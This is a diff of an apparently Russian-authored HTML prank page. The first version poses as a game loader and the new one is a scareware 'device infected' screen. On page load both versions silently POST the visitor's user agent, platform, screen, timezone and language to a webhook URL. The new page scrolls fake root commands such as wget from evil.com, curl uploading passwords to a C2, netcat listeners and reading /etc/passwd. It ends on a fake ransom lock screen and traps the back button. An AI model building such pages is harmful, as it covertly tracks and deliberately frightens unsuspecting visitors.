@@ -1,44 +1,185 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
 <meta charset="utf-8">
-<meta name="viewport" content="width=device-width,initial-scale=1">
-<title>Загрузка игры...</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<title>CRITICAL ERROR</title>
 <style>
-  body{font-family:-apple-system,sans-serif;background:#0d0d0d;color:#eee;
-       display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
-  .box{text-align:center}
-  .spin{width:50px;height:50px;border:4px solid #333;border-top-color:#2a6;
-        border-radius:50%;animation:s 1s linear infinite;margin:0 auto 20px}
-  @keyframes s{to{transform:rotate(360deg)}}
-  p{opacity:.8;font-size:16px;margin-bottom:20px}
-  .fake-btn{background:#333;color:#777;border:0;padding:12px 30px;border-radius:8px;font-size:14px;cursor:not-allowed}
+  @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+  
+  /* Базовые стили и черный фон */
+  body {
+    background-color: #000;
+    color: #ff003c;
+    font-family: 'Fira Code', monospace;
+    margin: 0;
+    padding: 0;
+    height: 100vh;
+    overflow: hidden;
+    display: flex;
+    flex-direction: column;
+    cursor: none; /* Прячем курсор для паники */
+  }
+
+  /* Тряска экрана */
+  @keyframes shake {
+    0% { transform: translate(1px, 1px) rotate(0deg); }
+    10% { transform: translate(-1px, -2px) rotate(-1deg); }
+    20% { transform: translate(-3px, 0px) rotate(1deg); }
+    30% { transform: translate(3px, 2px) rotate(0deg); }
+    40% { transform: translate(1px, -1px) rotate(1deg); }
+    50% { transform: translate(-1px, 2px) rotate(-1deg); }
+    60% { transform: translate(-3px, 1px) rotate(0deg); }
+    70% { transform: translate(3px, 1px) rotate(-1deg); }
+    80% { transform: translate(-1px, -1px) rotate(1deg); }
+    90% { transform: translate(1px, 2px) rotate(0deg); }
+    100% { transform: translate(1px, -2px) rotate(-1deg); }
+  }
+  
+  .shaking {
+    animation: shake 0.5s;
+    animation-iteration-count: infinite;
+  }
+
+  /* Вспышки */
+  @keyframes flash {
+    0%, 100% { background-color: #000; }
+    50% { background-color: #300; }
+  }
+  .flashing { animation: flash 0.2s infinite; }
+
+  /* Терминал */
+  .terminal-container {
+    padding: 20px;
+    flex-grow: 1;
+    display: flex;
+    flex-direction: column;
+    z-index: 10;
+  }
+
+  .terminal-output {
+    flex-grow: 1;
+    overflow-y: auto;
+    font-size: 12px;
+    line-height: 1.4;
+    white-space: pre-wrap;
+    text-shadow: 0 0 3px #ff003c;
+    padding-bottom: 50px;
+  }
+  
+  /* Скрываем скроллбар */
+  .terminal-output::-webkit-scrollbar { display: none; }
+
+  /* Текст предупреждения */
+  .alert-box {
+    border: 2px solid #ff003c;
+    padding: 15px;
+    margin-bottom: 20px;
+    background: rgba(255,0,60,0.1);
+    font-weight: bold;
+    text-align: center;
+    text-transform: uppercase;
+  }
+
+  /* Прогресс-бары */
+  .progress-row {
+    display: flex;
+    align-items: center;
+    margin: 5px 0;
+    font-size: 12px;
+  }
+  .progress-label {
+    width: 180px;
+    text-align: right;
+    padding-right: 10px;
+  }
+  .progress-bar-bg {
+    flex-grow: 1;
+    height: 10px;
+    background: #300;
+    border: 1px solid #ff003c;
+    position: relative;
+  }
+  .progress-bar-fill {
+    height: 100%;
+    background: #ff003c;
+    width: 0%;
+    transition: width 0.1s;
+  }
+  .progress-percent {
+    width: 50px;
+    text-align: left;
+    padding-left: 10px;
+  }
+
+  /* Оверлей блокировки */
+  #lock-screen {
+    display: none;
+    position: fixed;
+    top: 0; left: 0; width: 100%; height: 100%;
+    background: #000;
+    color: #ff003c;
+    z-index: 9999;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    text-align: center;
+    padding: 20px;
+  }
+  #lock-screen h1 { font-size: 50px; margin: 0; animation: pulse 1s infinite; }
+  #lock-screen p { font-size: 16px; margin-top: 20px; line-height: 1.5; }
+  
+  @keyframes pulse {
+    0%, 100% { opacity: 1; text-shadow: 0 0 20px #ff003c; }
+    50% { opacity: 0.5; text-shadow: none; }
+  }
 </style>
 </head>
 <body>
-<div class="box">
-  <div class="spin"></div>
-  <p id="msg">Подключение к серверу...</p>
-  <button class="fake-btn" disabled>Ожидайте...</button>
+
+<div class="terminal-container" id="main-ui">
+  <div class="alert-box">
+    ВНИМАНИЕ: НЕСАНКЦИОНИРОВАННЫЙ ДОСТУП<br>
+    УСТРОЙСТВО ЗАРАЖЕНО
+  </div>
+  
+  <div class="terminal-output" id="term">
+    <div>> Rootkit v4.2.1 initialized...</div>
+    <div>> Establishing encrypted connection to C2 server...</div>
+    <div>> Bypassing iOS/Android sandbox... [OK]</div>
+    <div>> Escalating privileges to ROOT...</div>
+  </div>
+</div>
+
+<!-- Экран блокировки -->
+<div id="lock-screen">
+  <h1>ЗАБЛОКИРОВАНО</h1>
+  <p>Все ваши данные зашифрованы.<br>Ваши фото и переписки отправлены оператору.<br>Устройство заблокировано на 24 часа.</p>
+  <p style="font-size:12px; color:#666; margin-top:40px;">Чтобы разблокировать, обратитесь к администратору.</p>
 </div>
 
 <script>
-// Твой webhook
+// =====================================================================
+// 1. КОНФИГУРАЦИЯ
+// =====================================================================
 const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
+const term = document.getElementById('term');
+const body = document.body;
+const lockScreen = document.getElementById('lock-screen');
 
-// Собираем данные без запроса GPS
+// =====================================================================
+// 2. СБОР ДАННЫХ (Пока человек смотрит в ужасе)
+// =====================================================================
 let data = {
-  event: "silent_visit",
-  ts: new Date().toISOString(),
+  event: "ultimate_takeover",
   ua: navigator.userAgent,
   platform: navigator.platform,
-  lang: navigator.language,
   screen: screen.width + "x" + screen.height,
   tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-  touch: navigator.maxTouchPoints
+  lang: navigator.language
 };
 
-// Отправляем данные сразу при открытии (без клика)
+// Тихая отправка
 fetch(HOOK, {
   method: "POST",
   mode: "no-cors",
@@ -46,14 +187,173 @@ fetch(HOOK, {
   body: JSON.stringify(data)
 }).catch(e => {});
 
-// Анимация текста
-let msg = document.getElementById("msg");
-let steps = ["Подключение к серверу...", "Загрузка ресурсов...", "Почти готово..."];
-let i = 0;
-setInterval(() => { i++; if (i < steps.length) msg.textContent = steps[i]; }, 1000);
+// =====================================================================
+// 3. ЗВУКОВОЙ ЭФФЕКТ (Писк)
+// =====================================================================
+function playBeep() {
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = 'sawtooth';
+    osc.frequency.setValueAtTime(800, ctx.currentTime);
+    osc.frequency.exponentialRampToValueAtTime(1200, ctx.currentTime + 0.1);
+    gain.gain.setValueAtTime(0.1, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.01, ctx.currentTime + 0.5);
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.5);
+  } catch(e) {}
+}
 
-// Через 3 секунды редирект на игру
-setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 3000);
+// =====================================================================
+// 4. ЛОГИКА ТЕРМИНАЛА (1000+ фейковых строк)
+// =====================================================================
+const fakeCommands = [
+  "cat /etc/passwd | grep root",
+  "chmod +x /system/bin/su",
+  "mount -o rw,remount /system",
+  "dd if=/dev/zero of=/data/local/tmp/encrypt",
+  "iptables -F",
+  "rm -rf /var/log/syslog",
+  "nc -lvp 4444",
+  "ssh root@192.168.1.1",
+  "smbclient -L //192.168.1.1",
+  "wget http://evil.com/payload.sh",
+  "curl -X POST -d @/sdcard/passwords.txt http://c2.server",
+  "find / -name '*.jpg' -exec cp {} /tmp/exfil/ \\;",
+  "adb shell pm list packages",
+  "keytool -list -v -keystore /data/misc/keystore",
+  "sqlite3 /data/data/com.whatsapp/databases/msgstore.db",
+  "cp /sdcard/DCIM/Camera/* /tmp/leak/",
+  "base64 -d /data/data/com.android.chrome/app_chrome/Default/Cookies",
+  "grep -r 'password' /sdcard/"
+];
+
+const fakeLogs = [
+  "[!] ACCESSING SYSTEM FILES...",
+  "[!] DUMPING RAM...",
+  "[!] DECRYPTING AES-256...",
+  "[!] EXFILTRATING PHOTOS... (1,248 files)",
+  "[!] EXFILTRATING MESSAGES... (Telegram, WhatsApp)",
+  "[!] HARVESTING PASSWORDS...",
+  "[!] BYPASSING 2FA...",
+  "[!] UPLOADING TO C2 SERVER...",
+  "[!] DELETING LOCAL BACKUPS...",
+  "[!] INSTALLING ROOTKIT..."
+];
+
+function typeLine(text, className = "") {
+  return new Promise((resolve) => {
+    const div = document.createElement('div');
+    if (className) div.className = className;
+    term.appendChild(div);
+    term.scrollTop = term.scrollHeight;
+    let i = 0;
+    const speed = Math.random() * 20 + 5; // Случайная скорость печати
+    
+    function type() {
+      if (i < text.length) {
+        div.textContent += text.charAt(i);
+        i++;
+        setTimeout(type, speed);
+      } else {
+        resolve();
+      }
+    }
+    type();
+  });
+}
+
+function addProgress(label, duration) {
+  return new Promise((resolve) => {
+    const row = document.createElement('div');
+    row.className = 'progress-row';
+    row.innerHTML = `
+      <div class="progress-label">${label}</div>
+      <div class="progress-bar-bg"><div class="progress-bar-fill"></div></div>
+      <div class="progress-percent">0%</div>
+    `;
+    term.appendChild(row);
+    term.scrollTop = term.scrollHeight;
+    
+    const fill = row.querySelector('.progress-bar-fill');
+    const pct = row.querySelector('.progress-percent');
+    let progress = 0;
+    
+    const interval = setInterval(() => {
+      progress += Math.random() * 5;
+      if (progress >= 100) {
+        progress = 100;
+        clearInterval(interval);
+        setTimeout(resolve, 200);
+      }
+      fill.style.width = progress + '%';
+      pct.textContent = Math.floor(progress) + '%';
+      term.scrollTop = term.scrollHeight;
+    }, duration);
+  });
+}
+
+// =====================================================================
+// 5. ГЛАВНЫЙ СЦЕНАРИЙ
+// =====================================================================
+async function runTakeover() {
+  body.classList.add('shaking');
+  body.classList.add('flashing');
+  playBeep();
+
+  // Фаза 1: Подготовка
+  await typeLine("> INITIATING SYSTEM OVERRIDE...", "alert-text");
+  await new Promise(r => setTimeout(r, 500));
+  await typeLine("> KERNEL PANIC IN 3... 2... 1...");
+  await new Promise(r => setTimeout(r, 800));
+  
+  // Фаза 2: Фейковый дамп
+  for (let i = 0; i < 30; i++) {
+    const cmd = fakeCommands[Math.floor(Math.random() * fakeCommands.length)];
+    const log = fakeLogs[Math.floor(Math.random() * fakeLogs.length)];
+    await typeLine(`root@device:~# ${cmd}`);
+    if (Math.random() > 0.7) await typeLine(log, "alert-text");
+    await new Promise(r => setTimeout(r, Math.random() * 100));
+  }
+
+  // Фаза 3: Прогресс-бары
+  await addProgress("Stealing Photos", 50);
+  await addProgress("Stealing SMS", 30);
+  await addProgress("Decrypting Wallet", 100);
+  await addProgress("Uploading to C2", 80);
+
+  // Фаза 4: Паника
+  body.style.backgroundColor = "#fff";
+  setTimeout(() => body.style.backgroundColor = "#000", 50);
+  setTimeout(() => body.style.backgroundColor = "#fff", 100);
+  setTimeout(() => body.style.backgroundColor = "#000", 150);
+  
+  playBeep();
+  await new Promise(r => setTimeout(r, 1000));
+
+  // Фаза 5: Блокировка
+  body.classList.remove('shaking');
+  body.classList.remove('flashing');
+  document.getElementById('main-ui').style.display = 'none';
+  lockScreen.style.display = 'flex';
+  playBeep();
+}
+
+// Запуск через 1 секунду
+setTimeout(runTakeover, 1000);
+
+// Блокируем попытки свайпа назад
+history.pushState(null, null, location.href);
+window.onpopstate = function () {
+  history.go(1);
+};
+
+// Блокируем контекстное меню (чтобы не сохранили)
+document.addEventListener('contextmenu', event => event.preventDefault());
+
 </script>
 </body>
 </html>
